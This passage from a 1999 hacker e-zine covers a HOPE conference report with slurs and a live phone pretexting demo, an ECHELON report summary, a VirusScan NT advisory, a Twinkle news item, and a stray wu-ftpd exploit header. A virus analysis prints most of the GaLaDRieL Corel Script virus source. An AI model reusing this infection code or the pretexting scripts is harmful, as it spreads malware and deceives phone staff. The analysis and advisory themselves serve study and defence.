       extremism grows stale.  It invites punitive retorts and teasing, or in counter-culture jargon, 
       "fucking with their heads." 
        
       Morty (perhaps for justifiable reasons) was totally inflexible and thus more prone to verbal 
       barbing.  "You're just a Jewish racist.  Racism in reverse," accused one jocular but definitely 
       lower middle class hacker with an accent thicker than all of Brooklyn.    
        
       Incoming Scuds!  Look out! Morty went nuts and as they say, freedom of speech ends when 
       my fists impacts upon your nose.  Morty came dangerously close to crossing that line.  Whoah, 
       Morty, whoah.  He's just fucking with your head.  The calm-down brigade did its level best to 
       keep these two mortals at opposite ends of the room.  
        
       "You support that Neo Nazi down there; you're as bad as the rest!" Morty said. "See what I 
       have to tolerate.  I know him, we've been keeping track of him and he hangs out with the son 
       of the Grand Wizard of Nazi Oz."  The paranoid train got on the tracks.   
        
       "Do you really know the Big Poo-bah of Hate?" I asked the hacker under assault and now 
       under protective custody. 
        
       "Yeah," he said candidly.  "He's some dick head who hates everyone.  Real jerk." 
        
       "So what about you said to Morty over there?" 
        
       "Just fucking with his head.  He gets a little extreme."  So we had in our midst the Al Sharpton 
       of the Jewish faith.  Ballsy. Since Morty takes Saturday's off by religious law, he missed the 
       press cavalcade, but as a radical New York fixture, the media probably didn't mind too much. 
        
       I was off to sessions, Morty found new audiences as they came off the elevators, and the band 
       played on. 
        
       * * * * * 
        
       In my humble 40-something opinion, the best session of HOPE was the one on social 
       engineering.   
        
       The panel consisted of only Emmanuel, Supernigger (social engineer par excellence) and 
       Cheshire Catalyst.  The first bits were pretty staid dry conventional conference (ConCon) 
       oriented, but nonetheless, not the kind of info that you expect to find William H. Murray, 
       Executive Consultant handing out.   
        
       The best social engineers make friends of their victims. Remember: you're playing a role.  
       Think Remington Steele. 
        
       Schmooze! "Hey, Jack did you get a load of the blond on Stern last night?" 
        
       Justifiable anger: "Your department has caused nothing but headaches.  These damn new 
       computers/phones/technology just don't work like the old ones.  Now either you help me now 
       or I'm going all the way to Shellhorn and we'll what he says about these kinds of screwups."  A 
       contrite response is the desired effect.  
        
       Butt headed bosses: "Hey, my boss is all over my butt, can you help me out?" 
        
       Management hatred:  "I'm sitting here at 3PM working while management is on their yachts.  
       Can you tell me . . .?" 
        
       Giveaways: "Did you know that so and so is having an affair with so and so?  It's true, I swear.  
       By the way, can you tell me how to . . ." 
        
       Empathy: "I'm new, haven't been to the training course and they expect me to figure this out all 
       by myself.  It's not fair." 
        
       Thick Accent: "Hi.  Dees computes haf big no wurk. Eet no makedah passurt. Cunu help?  Ah, 
       tanku." Good for a quick exchange and a quick good-bye. Carefully done, people want you off 
       the phone quickly. 
        
       Billsf, the almost 40 American phreak who now calls Amsterdam home was wiring up 
       Supernigger's real live demonstration of social engineering against Sprint. A dial tone came 
       over the PA system followed by the pulses to 411. 
        
       "Directory Assistance," the operator's male voice was squeezed into a mere three kilohertz 
       bandwidth. 
        
       Suddenly, to the immense pleasure of the audience, an ear-splitting screech a thousand times 
       louder than finger nails on a chalk board not only belched across the sound system but caused 
       instant bleeding in the ears of the innocent but now deaf operator. .  Billsf  sheepishly grinned.  
       "Just trying to wire up a mute button."   
        
       Three hundred people in unison responded: "It doesn't work."  No shit. 
        
       While Billsf feverishly worked to regain his reputation, Supernigger explained what he was 
       going to do. The phone companies have a service, ostensibly for internal use, called a C/NA.  
       Sort of a reverse directory when you have the number but want to know who the number 
       belongs to and from whence it comes. You can understand that this is not the sort of feature 
       that the phone company wants to have in the hands of a generation of kids who are so apathetic 
       that they don't even know they don't give a shit.  Nonetheless, the access to this capability is 
       through an 800 number and a PIN. 
        
       Supernigger was going to show us how to acquire such privileged information.  Live.  "When 
       you get some phone company person as dumb as a bolt on the other end, and you know a few 
       buzz words. you convince them that it is in their best interest and that they are supposed to give 
       you the information." 
        
       "I've never  done this in front of an audience before, so give me three tries," he explained to an 
       anxiously foaming at the mouth crowd.  No one took a cheap pot shot at him: tacit acceptance 
       of his rules. 
        
       Ring. Ring.  
        
       "Operations.  Mary." 
        
       "Mary.  Hi, this is Don Brewer in social engineering over at CIS, how's it going?"  Defuse. 
        
       "Oh, fine. I guess." 
        
       "I know, I hate working Sundays.  Been busy?" 
        
       "Nah, no more.  Pretty calm.  How can I help you?" 
        
       "I'm doing a verification and I got systems down.  I just need the C/NA.  You got it handy?"  
       Long pause. 
        
       "Sure, lemme look. Ah, it's 313.424.0900."  700 notebooks appeared out of nowhere, 
       accompanied by the sound of 700 pens writing down a now-public phone number. 
        
       "Got it. Thanks."  The audience is gasping at the stunningly stupid gullibility of Mary.  But 
       quiet was essential to the mission.  
        
       "Here's the PIN number while we're at it." Double gasp.  She's offering the supposedly super 
       secret and secure PIN number?  Was this event legal?  Had Supernigger gone over the line?  
       "No, CIS just came up.  Thanks anyway." 
        
       "Sure you don't need it?" 
        
       "Yeah. Thanks.  Bye."  Click. No need to press the issue.  PIN access might be worth a close 
       look from the next computer DA wanna-be. 
        
       An instant shock wave of cacophonous approval worked its way throughout the 750 seat 
       ballroom in less than 2 microseconds.  Supernigger had just successfully set himself as a 
       publicly ordained Cyber Christ of Social Engineering.  His white robes were on the way.  
       Almost a standing ovation lasted for the better part of a minute by everyone but the narcs in the 
       audience.  I don't know if they were telco or Feds of whatever, but I do know that they were 
       the stupidest narcs in the city of New York. This pair of dour thirty something Republicans had 
       sphincters so tight you could mine diamonds  out of their ass.   
        
       Arms defiantly and defensively crossed, they were stupid enough to sit in the third row center 
       aisle.  They never cracked a smile at some of the most entertaining performances I have seen 
       outside of  the giant sucking sound that emanates from Ross Perot's ears. 
        
       Agree or disagree with hacking and phreaking, this was funny and unrehearsed ad lib material.  
       Fools.  So, for fun, I crawled over the legs of the front row and sat in the aisle, a bare eight feet 
       from the narcs.  Camera in hand I extended the 3000mm tele-photo lens which can distinguish 
       the color of a mosquitoes underwear from a kilometer and pointed it in their exact direction.  
       Their childhood acne scars appeared the depth of the Marianna Trench.  Click, and the flash 
       went off into their eyes, which at such a short distance should have caused instant blindness.  
       But nothing.  No reaction.  Nada. Cold as ice.  Rather disappointing, but now we know that 
       almost human looking narc-bots have been perfected and are being beta tested at hacker cons.  
        
       Emmanuel Goldstein is very funny.  Maybe that's why Ed Markey and he get along so well.  
       His low key voice rings of a gentler, kinder sarcasm but has a youthful charm despite that he is 
       30- something himself.  
        
       "Sometimes you have to call back.  Sometimes you have to call over and over to get what you 
       want.  You have to keep in mind that the people at the other end of the phone are generally not 
       as intelligent as a powered down computer."  He proceeded to prove the point. 
        
       Ring ring, 
        
       "Directory Assistance." 
        
       "Hi." 
       "Hi." 
        
       "Hi." 
        
       "Can I help you." 
        
       "Yes." 
        
       Pause. 
        
       "Hello?" 
        
       "Hi." 
        
       "Hi." 
        
       "Can I help you.: 
        
       "OK."   
        
       Shhhhh.  Ssshhh.  Quiet.  Shhhh.  Too damned funny for words. 
        
       "Directory Assistance." 
        
       "I need some information." 
        
       "How can I help you." 
        
       "Is this where I get numbers?" 
        
       "What number would you like?" 
        
       "Information." 
        
       "This is information." 
        
       "You said directory assistance." 
        
       "This is." 
        
       "But I need information." 
        
       "What information do you need?" 
        
       "For information." 
        
       "This is information." 
        
       "What's the number?" 
        
       "For what?" 
        
       "Information." 
        
       "This is directory assistance."  
       "I need the number for information." 
        
       Pause.  Pause. 
        
       "What number do you want?" 
        
       "For information." 
        
       Pause.  Guffaws, some stifled, some less so.  Funny stuff.  
        
       "Hold on please." 
        
       Pause. 
        
       "Supervisor.  May I help you?" 
        
       "Hi." 
        
       "Hi." 
        
       Pause. 
        
       "Can I help you?" 
        
       "I need the number for information." 
        
       "This is directory assistance." 
        
       "Hi." 
        
       "Hi." 
        
       "What's the number for information?" 
        
       "This is information." 
        
       "What about directory assistance?" 
        
       "This is directory assistance." 
        
       "But I need information." 
        
       "This is information." 
        
       "Oh, OK. What's the number for information?" 
        
       Pause. 
        
       "Ah 411." 
        
       "That's it?" 
        
       "No. 555.1212 works too." 
       "So there's two numbers for information?" 
        
       "Yes." 
        
       "Which one is better?"   How this audience kept its cool was beyond me.  Me and my 
       compatriots were beside ourselves. 
        
       Pause. 
        
       "Neither." 
        
       "Then why are there two?" 
        
       Pause. 
        
       "I don't know." 
        
       "OK.  So I can use 411 or 555.1212." 
        
       "That's right." 
        
       "And which one should I use?" 
        
       Pause. 
        
       "411 is faster."  Huge guffaws.  Ssshhhh.  Ssshhhh.. 
        
       "Oh. What about the ones?" 
        
       "Ones?" 
        
       "The ones." 
        
       "Which ones?" 
        
       "The ones at the front of the number." 
        
       "Oh, those ones.  You don't need ones.  Just 411 or 555.1212.." 
        
       "My friends say they get to use ones."  Big laugh.  Shhhhhh. 
        
       "That's only for long distance." 
        
       "To where?"  How does he keep a straight face? 
        
       Pause. 
        
       "If you wanted 914 information you'd use a one." 
        
       "If I wanted to go where?" 
        
       "To 914?" 
        
       "Where's that?" 
       "Westchester." 
        
       "Oh, Westchester.  I have friends there." 
        
       Pause. 
        
       "Hello?" 
        
       "Yes?" 
        
       "So I use ones?" 
        
       "Yes.  A one for the 914 area." 
        
       "How?" 
        
       Pause. 
        
       "Put a one before the number." 
        
       "Like 1914. Right?" 
        
       "1914.555.1212." 
        
       "All of those numbers?" 
        
       "Yes." 
        
       "That's three ones." 
        
       "That's the area code." 
        
       "I've heard about those.  They confuse me."  Rumbling chuckles and laughs throughout the 
       hall.  
        
       Pause. 
        
       She slowly and carefully explained what an area code is to the howlingly irreverent amusement 
       of the entire crowd except for the fool narcs.  
        
       "Thanks.  So I can call information and get a number?" 
        
       "That's right." 
        
       "And there's two numbers I can use?" 
        
       "Yes." 
        
       "So I got two numbers on one call?" 
        
       "Yeah . . ." 
        
       "Wow.  Thanks.  Have a nice day."

       Comments heard around HOPE. 
        
       Rop Gongrijjp, Hacktic:  "The local phone companies use their own social engineers when they 
       can't get their own people to tell them what they need to know." 
        
       Sprint is using what they consider to be the greatest access mechanism since the guillotine.  For 
       all of us road warriors out there who are forever needing long distance voice service from the 
       Whattownisthis, USA airport, Sprint thinks they have a better mousetrap.  No more messing 
       finger entry.  No more pass-codes or PIN's.   
        
       I remember at the Washington National Airport last summer I was using my Cable and 
       Wireless long distance access card and entered the PIN and to my surprise, an automated voice 
       came on and said, "Sorry, you entered your PIN with the wrong finger.  Please try again." 
        
       Sprint says they've solved this thorny cumbersome problem with a service called "The Voice 
       Fone Card".  Instead of memorizing another 64 digit long PIN, you just speak into the phone:  
       "Hi, it's me.  Give me dial tone or give me death."  The voice recognition circuits masturbate 
       for a while to determine if it's really you or not.    
        
       Good idea.  But according to Strat, not a good execution.  Strat found that someone performing 
       a poor imitation of his voice was enough to break through the front door with ease.  Even a 
       poor tape recording played back over a cheap cassette speaker was sufficient to get through 
       Sprint's new whiz-banger ID system.   
        
       Strat laughed that Sprint officials said in defense, "We didn't say it was secure: just 
       convenient."   
        
       Smart.  Oh, so smart. 
        
       * * * * *  
        
       "If my generation of the late 60's and early 70's had had the same technology you guys have 
       there never would have been an 80's."  This was how I opened my portion of the author's panel. 
        
       The authors panel was meant to give HOPE hackers insight into how they are perceived from 
       the so-called outside.  I think the session achieved that well, and I understand the videos will be 
       available soon.   
        
       The question of electronic transvestites on AOL came up to everyone's enjoyment, and all of us 
       on the panel retorted with a big, "So what?"  If you have cyber-sex with someone on the 'Net 
       and enjoy it, what the hell's the difference?  Uncomfortable butt shifting on chairs echoed how 
       the largely male audience likely feels about male-male sex regardless of distance.  
        
       "Imagine," I kinda said, "that is a few years you have a body suit which not only can duplicate 
       your moves exactly, but can touch you in surprisingly private ways when your suit is connected 
       to another.  In this VR world, you select the gorgeous woman of choice to virtually occupy the 
       other suit, and then the two of you go for it.  How do you react when you discover that like 
       Lola, 'I know what I am, and what I am is a man and so's Lola.'"   Muted acknowledgment that 
       unisex may come to mean something entirely different in the not too distant future. 
        
       "Ooh, ooh, please call on me."  I don't mean to be insulting, but purely for identification 
       purposes, the woman behind the voice bordered on five foot four and four hundred pounds. 
       Her bathtub had stretch marks. 
        
       I never called on her but that didn't stop her. 
        
       "I want to know what you think of how the democratization of the internet is affected by the 
       differences between the government and the people who think that freedom of the net is the 
       most important thing and that government is fucked but for freedom to be free you have to 
       have the democracy behind you which means that the people and the government need to, I 
       mean, you know, and get along but the sub culture of the hackers doesn't help the government 
       but hackers are doing their thing which means that the democracy will not work , now I know 
       that people are laughing and giggling (which they were in waves) but I'm serious about this and 
       I know that I have a bad case of hypomania but the medication is working so it's not a bad as it 
       could be.  What do you think?" 
        
       I leaned forward into the microphone and gave the only possible answer.  "I dunno.  Next."  
       The thunderous round of applause which followed my in-depth response certainly suggested 
       that my answer was correct.  Not politically, not technically, but anarchistically. Flexibility 
       counts. 
        
       * * * * *  
        
       HOPE was attended by around one thousands folks, and the Hotel Filthadelphia still stands.  
       (Aw shucks.)   
        
       My single biggest complaint was not that the schedules slipped by an hour or two or three; 
       sessions at conferences like this keep going if the audience is into them and they are found to 
       be educational and productive.  So an hour session can run into two if the material and 
       presentations fit the mood.  In theory a boring session could find itself kama kazi'd into early 
       melt-down if you have the monotone bean counter from hell explaining the distributed 
       statistical means of aggregate synthetic transverse digitization in composite analogous integral 
       fruminations.  (Yeah, this audience would buy off on that in a hot minute.)  But there were not 
       any bad sessions.  The single track plenary style attracted hundred of hackers for every event.  
       Emmanuel and friends picked their panels and speakers well.  When dealing with sponge-like 
       minds who want to soak up all they can learn, even in somewhat of a party atmosphere, the 
       response is bound to be good.   
        
       My single biggest complaint was the registration nightmare.  I'd rather go the DMV and stand 
       in line there than get tagged by the seemingly infinite lines at HOPE.  At DefCon early 
       registration was encouraged and the sign up verification kept simple. 
        
       For some reason I cannot thoroughly (or even partially) fathom, a two step procedure was 
       chosen.  Upon entering, and before the door narcs would let anyone in, each attendee  had to be 
       assigned a piece of red cardboard with a number on it.  For the first day you could enter the 
       'exhibits' and auditorium without challenge.  But by Day 2 one was expected to wait in line for 
       the better part of a week, have a digital picture taken on a computer tied to a CCD camera,  and 
       then receive a legitimate HOPE photo-ID card.  What a mess. I don't have to beat them up on it 
       too bad; they know the whole scheme was rotten to the core.   
        
       I waited till near  the end of Day 2 when the lines were gone and the show was over.  That's 
       when I got my Photo ID card.  I used the MIB's photo ID card the rest of the time. 
        
       HOPE was a lot of fun and I was sorry to see it end, but as all experiences, there is a certain 
       amount of letdown.  After a great vacation, or summer camp, or a cruise, or maybe even after 
       Woodstock, a tear welts up.  Now I didn't cry that HOPE was over, but an intense 48 hours 
       with hackers is definitely not your average computer security convention that only rolls from 
       9AM to Happy Hour.  At a hacker conference, you snooze, you lose.  You never know what is 
       going to happen next - so much is spontaneous and unplanned - and it generally is highly 
       educational, informative and entertaining. 
        
       Computer security folks:  you missed an event worth attending.  You missed some very funny 
       entertainment.  You missed some fine young people dressed in some fine garb.  You missed the 
       chance to meet with your perceived 'enemy'.  You missed the opportunity to get inside the 
       heads of the generation that knows more about keyboards than Huck Finning in suburbia.  You 
       really missed something, and you should join Robert MIB Steele and I at the next hacker 
       conference.     
        
       * * * * * 
        
       If only I had known. 
          
       If only I had known that tornadoes had been dancing up and down 5th avenue I would have 
       stayed at the Hotel Filthadelphia for another night.   
        
       La Guardia airport was closed.  Flights were up to 6 hours delayed if not out and out canceled.  
       Thousands of stranded travelers hunkered down for the night.  If only I had known.   
       Wait, wait. Hours to wait.  And then, finally, a plane ready and willing to take off and swerve 
       and dive between thunderbolts and twisters and set me on my way home.   
        
       My kids were bouncing out of the car windows when my wife picked me up at the airport 
       somewhere in the vicinity of 1AM.   
        
       "Not too late are you dear?"  Sweet Southern Sarcasm from my Sweet Southern Wife.   
        
       "Don't blame me," I said in all seriousness.  "It was the hackers.  They caused the whole thing."

 42.0  IC2000, Interception Capabilities 2000 and ECHELON
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       7 May 1999. Thanks to Anonymous. 
       
       http://jya.com/crypto.htm
       http://jya.com/ic2000-dc.htm
       
       7 May 1999
       
       Interception Capabilities 2000        ("IC2000")
       
       The IC2000 report on communications interception and ECHELON was approved 
       as a working document by the Science and Technology Options Assessment 
       Panel of the European Parliament (STOA) at their meeting in Strasbourg on 6 
       May 1999.
       
       Key findings of the IC2000 report
       
       ·       Comprehensive systems exist to access, intercept and 
       process every important modern form of  communications, with few exceptions 
       (section 2, technical annexe);
       
       ·       The report provides original new documentary and other 
       evidence about the ECHELON system and its role in the interception of 
       communication satellites (section 3). In excess of 120 satellite based 
       systems are currently in simultaneous operation collecting intelligence 
       (section 2).    Submarines are routinely used to access and intercept 
       undersea communications systems.
       
       ·       There is wide-ranging evidence indicating that major governments 
       are routinely utilising communications intelligence to provide commercial 
       advantage to companies and trade.
       
       ·       Although "word spotting" search systems to automatically 
       select telephone calls of intelligence interest are not thought to be 
       effective, speaker recognition  systems  in effect, "voiceprints"  have 
       been developed and are deployed to recognise the speech of targeted 
       individuals making international telephone calls;
       
       ·       Recent diplomatic initiatives by the United States government 
       seeking European agreement to the "key escrow" system of cryptography 
       masked intelligence collection requirements, forming part of a long-term 
       program which has undermined and continues to undermine the communications 
       privacy European companies and citizens;
       
       ·       Interception for legally authorised domestic interception and 
       interception for clandestine intelligence purposes must be sharply 
       distinguished.  A clear boundary between law enforcement and "national 
       security" interception activity is essential to the protection of human 
       rights and fundamental freedoms.
       
       ·       Providing the measures called for in the 1998 Parliamentary 
       resolution on "Transatlantic relations/ECHELON measures may be facilitated 
       by developing an in-depth understanding of present and future Comint 
       capabilities.   Protective measures may best be focused on defeating 
       hostile Comint activity by denying access or, where this is impractical or 
       impossible, preventing processing of message content and associated traffic 
       information by general use of cryptography.
       
       ·       In relation to the manner in which Internet browsers and other 
       software is deliberately weakened for use by other than US citizens, 
       consideration could be given to a countermeasure whereby, if systems with 
       disabled cryptographic systems are sold outside the United States, they 
       should be required to conform to an "open standard" such that third parties 
       and other nations may provide additional applications which restore the 
       level of security to at least that enjoyed by domestic US customers.
       
       ·       It should be possible to define and enforce a shared interest in 
       implementing measures to defeat future external Sigint activities directed 
       against European states, citizens and commercial activities.

       To: BUGTRAQ@netspace.org 
       
       
       this works on a lot of wu-ftpd`s
       also uses other commands than MKD to
       exploit realpath() overflow

       * Remote/local exploit for wu-ftpd [12] through [18]
       * gcc w00f.c -o w00f -Wall -O2
       *
       * Offsets/padding may need to be changed, depending on remote daemon
       * compilation options. Try offsets -5000 to 5000 in increments of 100.
       *

                                  Application : Network Associates' VirusScan NT
                                     Severity : Medium
       
       
       
       Synopsis
       --------
       
       
       Network Associates VirusScan NT (formerly McAfee VirusScan NT) version
       4.0.2 does not properly update virus signature definition files under
       certain conditions, and will falsely report it is up to date during manual
       updates. This impacts both NT Server and Workstation.
       
       
       Tested configuration
       --------------------
       
       
       Microsoft NT Server 4.0 w/SP3, Network Associates VirusScan NT version
       4.0.2.
       
       
       Microsoft NT Workstation 4.0 w/SP3 and SP4, Network Associates VirusScan
       NT version 4.0.2.
       
       
       Pre-4.0.2 versions of VirusScan NT were not tested, nor were versions for
       other platforms, such as Windows 95 or 98.
       
       
       Bug(s) report
       -------------
       
       
       Network Associates VirusScan NT has a feature that allows for a user to
       update the virus definitions file via ftp. This task can also be automated
       via the VirusScan NT AntiVirus Console. In version 4.0.2, the scan engine
       holds open the main definition file scan.dat (located in the VirusScan NT
       directory) during the ftp process, preventing the file from being
       overwritten with the new version. The engine itself apparently does not
       check return codes and will not notify the user that the file was not
       updated. Worse, the Application Log is updated as if the install completed
       properly, therefore subsequent downloads of new definition files will not
       update the scan.dat properly. Subsequent manual downloads will in fact
       tell you that you already have the latest definition file when in fact you
       do not.
       
       
       NMRC was not able to make this error occur consistently, and we strongly
       suspect that a race condition exists where the updates will occasionally
       work, but we were able to duplicate the error condition most of the time.
       Testing was done in NMRC labs, and at two corporate locations.
       
       
       To verify the proper definitions file, check the About box from the
       AntiVirus Console program for the latest date next to the text "Created
       On". If after a manual or automatic update this date does not change, your
       definitions have not been properly updated.
       
       
       The implication here is that the administrator or end user believes their
       system is protected when it in fact is not.
       
       
       Solution/Workaround
       -------------------
       
       
       Upgrade to Network Associates VirusScan NT version 4.0.3a, which resolves
       the problem. Alternately, disable the VirusScan engine, wait several
       seconds for the operating system to close the file, and manually copy the
       definition files into the VirusScan NT directory. This second method will
       place your log files out of sync with the definition files until the next
       manual or automatic download, but this should not impact functionality.
       
       
       It is recommended that you disable 4.0.2 (or even uninstall) before
       performing an upgrade to 4.0.3a due to other problems we encountered
       during the testing of this product, such as being unable to properly stop
       the VirusScan services before upgrading. Once again, these problems were
       inconsistent but happened several times on several systems.
       
       
       One further note, in a restricted NT workstation environment, it is next
       to impossible to have the user upgrade the product themselves. Local admin
       rights are required to make this happen, and this will require a visit
       from an individual with adequate rights to the workstation to complete the
       upgrade.
       
       
       Comments
       --------
       
       
       Network Associates has been notified and recommend the upgrade to 4.0.3a
       to resolve the problem. This problem was discovered while investigating
       why upgraded machines were still infected by various Microsoft Word macro
       virii after they had been upgraded to the latest definition files.
       
       
       Network Associates can be reached at http://www.nai.com/. Unfortunately
       at the time of this writing the ftp location of the 4.x definition files
       was not present. It's supposed to be at
       ftp://ftp.nai.com/pub/antivirus/update/4.x but had disappeared from the
       server(s).

 45.0  New CorelDraw Virus
       ~~~~~~~~~~~~~~~~~~~
       From http://www.403-security.org/
              
       CorelDraw virus found
       Astral 07.05.1999 17:15

       HispaSec discovred virus in CorelDraw.This is first virus based on CorelDraw Script.Virus is named
       GaLaDRieL.Once this virus gets in your computer it affects files by adding victima$ label in CSC file
       once added also adds yo_estoy_en$ label in same CSC file and after both labels are added it
       modifies LothLorien label.More about it on HispaSec. 
      
       
       6-5-1999 - HispaSec discovers the first virus for Corel Draw
      We introduce "GaLaDRieL", the first virus ever based on
      Corel Script, the computer language designed for Corel
      Draw's task and script automation. Albeit its effects are not
      harmful, we're undoubtedly dealing with an innovation in the
      macro virus area which may open a new way of
      development.

      Corel Script is the language, based upon the popular
      BASIC, designed for macro coding in the Corel pack. A
      macro is a computer program which runs a series of
      instructions so as to automate repetitive tasks, or to
      simplify complex actions, as well as to ask for entries, view
      messages or to swap information with other applications.
      This is what Corel Draw calls "scripts", a kind of files with
      "CSC" as extension, which are the victims of this new brand
      virus.

      In the first line of its code we can find the virus identification:
      name, author, and virus writing group its author belongs to.

      ---------
      REM ViRUS GaLaDRieL FOR COREL SCRIPT bY
      zAxOn/DDT
      ---------

      After this, the virus gets the system date and checks
      whether it coincides with june 6th of any year. When this
      happens, the virus jumps to a label called "Elessar", where
      its payload can be found, which consists on displaying an
      excerpt from "The Lord Of The Rings". Anyhow the program
      eventually jumps to a label called "Palantir".

      ---------
      fecha$=GetCurrDate () 
      If Left(fecha$,1)="6" Then If Mid(fecha$,3,2)="06" Then Goto
      Elessar
      Goto Palantir
      Elessar:
      Mensajito$= " 
      Ai! laurië lantar lassi súrinen!. 
      Yéni únótime ve rámar aldaron,
      yéni ve linte yuldar vánier
      mi oromardi lisse-miruvóreva
      Andúne pella Vardo tellumar
      nu luini yassen tintilar i eleni
      ómaryo airetári-lirinen.
      ...."
      Titulo = "GaLaDRieL ViRUS bY zAxOn/DDT"
      Messagebox Mensajito$,Titulo,64
      ----------

      The virus looks for the first file containing the "CSC"
      extension (Corel Script) with the attributes 32 or 128, which
      stand for normal files. When it finds such a victim, the virus
      opens it for reading and checks for the text string "REM
      ViRUS", which determines whether the file has been
      previously infected. When it finds a suitable victim according
      to its own features, then assings the file name to the
      variable called "victima$".

      ----------
      Palantir:
      nombre$=FindFirstFolder ("*.csc",32 or 128)
      Do while not nombre$=""
      Open nombre$ For Input As #1
      Palacios_Intemporales:
      Line Input #1,linea$
      If linea$="" then goto Palacios_Intemporales
      if victima_bool=1 Then Goto Esgaroth
      If Instr(linea$,"REM ViRUS",1)=0 then
      victima$=nombre$
      victima_bool=1
      End if
      -----------

      The virus then keeps on looking for files fitting its search
      wildcard ("CSC" extension and attributes 32 or 128, by
      means of the "FindNextFolder()" instruction). When the virus
      finds an infected file through this second search, it proceeds
      to store its file name into the "yo_estoy_en$" variable. Once
      both the victim ("victima$") and the already infected file
      ("yo_estoy_en$") are ready, the virus jumps to a label called
      "LothLorien". For those cases in which the virus is not able
      of finding any of the two files mentioned above, the virus
      skips the infection process and jumps to a new label, called
      "Los_Puertos_Grises".

      -----------
      Esgaroth:
      If Instr(linea$,"REM ViRUS",1)<> 0 Then 
      yo_estoy_en$=nombre$
      conocimiento=1
      End if
      Close 
      If conocimiento=1 Then If victima_bool=1 Then Goto
      LothLorien
      nombre$=FindNextFolder ()
      If nombre$="" Then Goto Los_Puertos_Grises
      Loop
      -----------

      In its last stage we have the chance to find a rather peculiar,
      bad optimized, way of infecting the victim file with the virus
      body. The first step consists on deleting a temporal file
      called "mallorn.tmp", which might be found in the system
      because of previous infections. It renames then the victim
      file to "mallorn.tmp", by means of the instruction "Rename
      victima$,"mallorn.tmp",0". The last parameter ("0") indicates
      that in those cases in which the "mallorn.tmp" file would
      already exist (even though it was supposed to have been
      previously deleted by the virus itself) it would be overwritten.
      This is just a small example of the poor code optimization of
      the infection routine.

      After having performed the above operations, the virus opens
      the file specified by the "yo_estoy_en$" variable for reading
      and then the one pointed to by "victima$" for writing. After
      this, and by means of a loop, GaLaDRieL parses its code,
      line by line, until reaching the "REM END" string, which
      tells the virus the process is done. It closes then both files
      and reopens the victim file, this time in "Append" mode, in
      order to attach, by means of this method, the code lines
      which belong to the original script code, previously saved to
      the "mallorn.tmp" file. Eventually the virus deletes one more
      time the temporary file, and the last thing we find in its code
      is the text line we've just talked about, the one which tells
      GaLaDRieL where the tail of the virus body is located at.

      -----------
      LothLorien: 
      Kill "mallorn.tmp"
      Rename victima$,"mallorn.tmp",0
      Open yo_estoy_en$ For Input As #1
      open victima$ For Output As #2
      Do While Not Left(linea$,7)="REM END"
      Line Input #1,linea$
      Print #2,linea$
      Loop
      Line Input #1,linea$
      Print #2,linea$
      Close
      Open victima$ For Append As #1
      Open "mallorn.tmp" For Input As #2
      Do While Not Eof(2)
      Line Input #2,linea$
      Print #1,linea$
      Loop
      Close
      Kill "mallorn.tmp"

      Los_Puertos_Grises:
      REM END OF ViRUS GaLaDRieL bY zAxOn/DDT
      ------------

      There's no doubt about the fact that we're talking about a
      virus which won't travel too far, something to which we could
      add its poor code optimization. >From this, it's not difficult
      to guess that its author's purpose was to show the viability
      of developing viruses in this new environment, leaving back
      other kinds of more commonly infected victims. Suming up,
      we're dealing with an innovating virus in which concerns to
      the platform it's designed to work in, and that it can mean
      the begin of a new macro virus family for Corel Draw.

 46.0  TWINKLE, the number crunching machine to attack RSA keys

       Twinkle: The Magic Light That Breaks The Code

      May 6, 1999, 22:45
      Author: i_am_online
  
      Twinkle and you're done, the magic light that breaks the code. Computer scientist Adi Shamir who is a co-creator of the RSA public key
      algorithm has developed a computer that is light based and that can decode data to an extent far past what is normally used in
      e-commerce. Its name is Twinkle, and Adi Shamir this Tuesday in Prague demonstrated it at the 1999 Eurocrypt conference. 
  
      Twinkle can find the correct key, efficiently, for decrypting messages that have been encrypted with 512-bit keys, said Shamir. The
      Twinkle design goes with prior expectations about the consequence of RSA keys as long as 512 bits. But key sizes larger are still out of
      reach aside Shamir's progress in code breaking. 
  
      What Twinkle stands for is "The Weizmann Institute Key Locating Engine." Twinkle is very different than that of the electronic design of a
      normal computer; Twinkle is based solely on optoelectronics, which use light to transfer info digitally. Shamir predicts that the Twinkle
      mechanism would be as effective as about 100 to 1,000 PCs. Not just that, but the machine could be easily built with little funding, Shamir
      says that a Twinkle machine could be built for as little as $5,000. On the other hand the DES Cracker cost the Us government $250,000
      to build.

       The Light That Cracks the Code
       by Chris Oakes 
       
       5:00 p.m.  4.May.99.PDT
       A computer scientist has designed a light-based computer that could unscramble data to a degree well
       beyond that typically used in e-commerce. 
       
       "Twinkle," a yet-to-be-built crypto-cracking machine, was introduced Tuesday by famed computer scientist
       Adi Shamir at the Eurocrypt '99 conference in Prague. 
       
       Shamir's Twinkle proves an oft-repeated point: To adequately hide electronic information from prying eyes, 
       data needs to be locked up beyond the limits of technology in common use today. 
       
       The strength of a given cryptography scheme is expressed in the number of bits in the "key" required to 
       unlock the code. For example, popular encryption programs used in the United States support the equivalent
       of 1024- to 2048-bit security. Each additional bit doubles the strength of the cipher from trial-and-error
       attacks. 
       
       Twinkle can quickly determine the correct key for unlocking messages that have been encrypted with 512-bit
       keys, said Shamir, who is also co-inventor of the RSA public-key algorithm -- a de facto standard for Internet
       security. 
       
       "[This] remind[s] people that yes, what the experts have been saying about key size is really the case," said
       Burt Kaliski, chief scientist at pioneer encryption company RSA Data Security, which built its business around
       the encryption algorithm. 
       
       Kaliski said the Twinkle design confirms previous expectations about the appropriateness of RSA keys as long
       as 512 bits. But he emphasized that larger key sizes are still out of reach despite Shamir's advance. 
       
       "The primary impact [of Twinkle] is that it makes 512-bit keys for RSA more at risk than was previously 
       considered," said Kaliski. "It will have a similar effect to the Deep Crack machine." 
       
       Deep Crack is a specially designed supercomputer that in July 1998 first cracked the level of encryption used 
       to secure most nonclassified government data. In January 1999, with an Internet-wide volunteer computer effort
       and the Electronic Frontier Foundation behind the project, Deep Crack unlocked a message secured with the 56-bit
       Data Encryption Standard -- the equivalent of a 384-bit RSA key -- in a mere 22 hours and 15 minutes. 
       
       Deep Crack was designed to send a message to the US government that the strongest data-scrambling technology 
       legally allowed to leave American shores is no longer strong enough to be useful. 
       
       Public-key cryptography is secure because it hinges on a mathematical truth -- it's very difficult to find two
       prime factors of another known number. The Twinkle machine would greatly accelerate the process of collecting 
       equations, which is the first step in factoring a large number. This step, known as "sieving," is a key to 
       deciphering an RSA-encrypted message. 
       
       The second step in the factoring process entails calculating the equations once they are collected, and it is 
